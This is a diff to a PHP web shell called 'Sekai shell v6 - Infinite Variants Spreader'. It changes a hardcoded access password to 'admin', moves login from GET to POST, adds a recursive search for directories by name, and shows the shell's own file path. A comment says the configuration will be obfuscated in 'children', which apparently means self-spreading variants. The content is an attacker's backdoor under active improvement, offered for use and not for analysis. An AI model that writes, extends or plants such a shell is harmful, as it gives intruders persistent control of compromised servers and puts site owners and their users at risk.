@@ -5,7 +5,7 @@
 // ========================================================
 
 // --- Core configuration (will be obfuscated in children) ---
-$secret_pass = 'adminsekai';  // CHANGE THIS TO YOUR PASSWORD
+$secret_pass = 'admin';  // CHANGE THIS TO YOUR PASSWORD
 
 session_start();
 
@@ -14,12 +14,12 @@ header("Pragma: no-cache");
 header("Expires: Sat, 26 Jul 1997 05:00:00 GMT");
 
 // Password protection
-if (isset($_GET['pass']) && $_GET['pass'] === $secret_pass) {
+if (isset($_POST['pass']) && $_POST['pass'] === $secret_pass) {
     $_SESSION['authenticated'] = true;
-    $_SESSION['pass'] = $_GET['pass'];
+    $_SESSION['pass'] = $_POST['pass'];
 }
 if (!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true) {
-    die('<form method="GET">Password: <input type="password" name="pass"><input type="submit"></form>');
+    die('<form method="POST">Password: <input type="password" name="pass"><input type="submit"></form>');
 }
 
 // Persistent working directory
@@ -27,6 +27,33 @@ if (!isset($_SESSION['cwd'])) {
     $_SESSION['cwd'] = getcwd();
 } else {
     chdir($_SESSION['cwd']);
+}
+$self_path = realpath(__FILE__);
+if ($self_path === false) {
+    $self_path = __FILE__;
+}
+
+function find_dir_by_name($base, $name, $max_depth = 5) {
+    $queue = [[$base, 0]];
+    while ($queue) {
+        $current = array_shift($queue);
+        $dir = $current[0];
+        $depth = $current[1];
+        if ($depth > $max_depth) continue;
+        $items = @scandir($dir);
+        if ($items === false) continue;
+        foreach ($items as $item) {
+            if ($item === '.' || $item === '..') continue;
+            $path = $dir . DIRECTORY_SEPARATOR . $item;
+            if (is_dir($path)) {
+                if ($item === $name) return $path;
+                if (!is_link($path)) {
+                    $queue[] = [$path, $depth + 1];
+                }
+            }
+        }
+    }
+    return null;
 }
 
 // Handle directory change
@@ -37,6 +64,15 @@ if (isset($_GET['cd'])) {
         header("Location: ?pass=" . urlencode($_SESSION['pass']));
         exit;
     } else {
+        $dir_name_only = strpos($newdir, '/') === false && strpos($newdir, '\\') === false;
+        if ($dir_name_only && $newdir !== '') {
+            $found = find_dir_by_name($_SESSION['cwd'], $newdir, 6);
+            if ($found !== null && chdir($found)) {
+                $_SESSION['cwd'] = getcwd();
+                header("Location: ?pass=" . urlencode($_SESSION['pass']));
+                exit;
+            }
+        }
         $cd_error = "Cannot change to $newdir";
     }
 }
@@ -733,7 +769,7 @@ foreach ($files as $f) {
 <!DOCTYPE html>
 <html>
 <head>
-    <title>WebShell v5 - Infinite Variants Spreader</title>
+    <title>Sekai shell v6 - Infinite Variants Spreader</title>
     <style>
         body { font-family: ui-sans-serif, system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif; background: #0f0f10; color: #e8e8e8; margin: 20px; }
         input, textarea, select, button { background: #161719; color: #e8e8e8; border: 1px solid #2d2f33; padding: 8px; border-radius: 6px; }
@@ -787,6 +823,7 @@ foreach ($files as $f) {
 
 <!-- Current directory & error display -->
 <p><strong>Current directory:</strong> <?php echo htmlspecialchars($cwd); ?></p>
+<p><strong>Shell file:</strong> <?php echo htmlspecialchars($self_path); ?></p>
 <div class="breadcrumbs"><?php echo $breadcrumbs_html; ?></div>
 <?php if (isset($cd_error)) echo "<p class='error'>$cd_error</p>"; ?>
 <?php echo $action_result; ?>
